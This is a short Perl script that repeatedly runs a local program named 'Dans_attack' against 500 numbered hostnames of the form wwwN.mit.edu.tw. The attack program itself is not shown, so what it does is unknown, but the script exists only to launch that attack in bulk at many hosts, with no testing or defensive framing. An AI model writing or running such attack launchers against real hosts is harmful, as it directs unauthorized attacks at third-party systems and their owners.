#! /usr/bin/perl

$attack = "Dans_attack";

for ( $i=0 ; $i < 500 ; $i++ ){
	$cmd = "./$attack www".$i.".mit.edu.tw";
	system($cmd);
}
